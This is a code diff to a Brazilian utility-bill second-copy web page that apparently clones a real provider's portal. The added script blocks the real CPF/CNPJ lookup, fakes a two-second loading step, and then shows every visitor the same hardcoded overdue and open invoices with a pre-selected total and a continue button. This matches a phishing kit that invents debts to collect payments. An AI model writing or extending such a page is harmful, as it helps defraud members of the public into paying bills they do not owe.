@@ -28,6 +28,7 @@
  </div>
  <section class=service-content>
  <h1>2ª via fácil</h1>
+ <div id=view-form>
  <p id=mode-intro class=intro>Informe seu <strong>CPF / CNPJ</strong> para emitir o <strong>documento de pagamento</strong> de imóveis que já estiveram em sua titularidade.</p>
  <div class=mode-switch role=tablist aria-label="Tipo de consulta" style=--switch-offset:0%>
  <button type=button class="mode-option active" data-mode=cpf aria-selected=true>
@@ -74,6 +75,19 @@
  <button class=continue type=submit>Continuar</button>
  <p id=message></p>
  </form>
+ </div>
+ <div id=view-result class=sf-hidden>
+ <p id=result-intro class=intro>Consulte suas contas para selecionar o <strong>documento de pagamento</strong>.</p>
+ <label class="inv-row inv-all"><input type=checkbox id=select-all checked><span class=inv-all-label>Selecionar todos</span></label>
+ <div id=invoice-list></div>
+ <div class=inv-summary>
+ <p class=inv-summary-label>Valor a pagar não<br>considerando os juros e multas</p>
+ <p class=inv-total id=invoice-total>R$ 0,00</p>
+ </div>
+ <div style="display:flex;justify-content:center;margin:10px 0 4px">
+ <button type=button class=continue id=result-continue>Continuar</button>
+ </div>
+ </div>
  </section>
  </div>
 </main>
@@ -279,6 +293,98 @@
     });
   }
   if(document.readyState === 'loading'){ document.addEventListener('DOMContentLoaded', init); } else { init(); }
+})();
+</script>
+<style>
+#view-result{animation:fadeview .25s ease}
+@keyframes fadeview{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+#result-intro{margin:0 0 26px}
+.inv-row{display:grid;grid-template-columns:26px 92px 120px 1fr;align-items:center;gap:16px;padding:16px 0;border-bottom:1px solid #eef0f6}
+.inv-all{border-bottom:1px solid #d6dae6;padding:10px 0 16px;cursor:pointer}
+.inv-all-label{grid-column:2 / -1;font-weight:700;font-size:16px;color:#3a4150}
+.inv-row input[type=checkbox],#select-all{width:18px;height:18px;accent-color:#2d70b9;cursor:pointer}
+.inv-mes{font-weight:700;color:#3a4150;font-size:15px}
+.inv-status{color:#3a4150;font-size:15px}
+.inv-right{display:flex;align-items:center;justify-content:flex-end;gap:26px}
+.inv-due{color:#8a8f99;font-size:13px}
+.inv-val{font-weight:700;color:#3a4150;font-size:15px}
+.inv-summary{text-align:center;margin:30px 0 20px}
+.inv-summary-label{color:#8a8f99;font-size:14px;line-height:1.5;margin:0 0 16px}
+.inv-total{font-weight:700;color:#3a4150;font-size:18px;margin:0}
+#result-continue{width:100%;max-width:360px}
+@media (max-width:520px){.inv-row{grid-template-columns:20px 52px 70px 1fr;gap:8px}.inv-mes,.inv-status,.inv-val{font-size:13px}.inv-right{gap:8px}.inv-due{font-size:11px}}
+</style>
+<script>
+(function(){
+  var DEFAULT_INVOICES=[
+    {mes:'11/2026',status:'Atrasada',venc:'05/11/2026',valor:316.37},
+    {mes:'11/2026',status:'Atrasada',venc:'05/11/2026',valor:309.21},
+    {mes:'12/2026',status:'Em aberto',venc:'05/12/2026',valor:492.17},
+    {mes:'12/2026',status:'Em aberto',venc:'05/12/2026',valor:360.19}
+  ];
+  var CITY_INVOICES={};
+  function invoicesFor(city){ return (city && CITY_INVOICES[city]) ? CITY_INVOICES[city] : DEFAULT_INVOICES; }
+  function brl(n){ return 'R$ ' + n.toLocaleString('pt-BR',{minimumFractionDigits:2,maximumFractionDigits:2}); }
+  function init(){
+    var form=document.getElementById('second-copy-form');
+    var viewForm=document.getElementById('view-form');
+    var viewResult=document.getElementById('view-result');
+    var overlay=document.getElementById('loading-overlay');
+    var list=document.getElementById('invoice-list');
+    var totalEl=document.getElementById('invoice-total');
+    var selectAll=document.getElementById('select-all');
+    if(!form||!viewForm||!viewResult||!list) return;
+    function selectedCity(){
+      var mode=form.getAttribute('data-mode');
+      var el=document.getElementById(mode==='cdc'?'city-search-cdc':'city-search');
+      return el?el.value.trim():'';
+    }
+    function recalc(){
+      var sum=0;
+      list.querySelectorAll('.inv-check').forEach(function(cb){ if(cb.checked) sum+=parseFloat(cb.getAttribute('data-valor')); });
+      totalEl.textContent=brl(sum);
+      var all=list.querySelectorAll('.inv-check');
+      var checked=list.querySelectorAll('.inv-check:checked');
+      if(selectAll) selectAll.checked=all.length>0 && checked.length===all.length;
+    }
+    function render(city){
+      var items=invoicesFor(city);
+      list.innerHTML=items.map(function(it){
+        return '<label class="inv-row"><input type=checkbox class=inv-check checked data-valor="'+it.valor+'">'+
+          '<span class=inv-mes>'+it.mes+'</span>'+
+          '<span class=inv-status>'+it.status+'</span>'+
+          '<span class=inv-right><span class=inv-due>Vencimento: '+it.venc+'</span><span class=inv-val>'+brl(it.valor)+'</span></span>'+
+          '</label>';
+      }).join('');
+      list.querySelectorAll('.inv-check').forEach(function(cb){ cb.addEventListener('change',recalc); });
+      if(selectAll) selectAll.checked=true;
+      recalc();
+    }
+    if(selectAll){
+      selectAll.addEventListener('change',function(){
+        list.querySelectorAll('.inv-check').forEach(function(cb){ cb.checked=selectAll.checked; });
+        recalc();
+      });
+    }
+    function goResult(){
+      var city=selectedCity();
+      if(overlay){ overlay.style.opacity='1'; overlay.style.visibility='visible'; overlay.style.pointerEvents='auto'; }
+      setTimeout(function(){
+        if(overlay){ overlay.style.opacity=''; overlay.style.visibility=''; overlay.style.pointerEvents=''; }
+        render(city);
+        viewForm.classList.add('sf-hidden');
+        viewResult.classList.remove('sf-hidden');
+        try{ window.scrollTo(0,0); }catch(e){}
+      },2000);
+    }
+    form.addEventListener('submit',function(e){
+      e.preventDefault();
+      var btn=form.querySelector('.continue');
+      if(btn && btn.disabled) return;
+      goResult();
+    },true);
+  }
+  if(document.readyState==='loading'){ document.addEventListener('DOMContentLoaded',init); } else { init(); }
 })();
 </script>
 
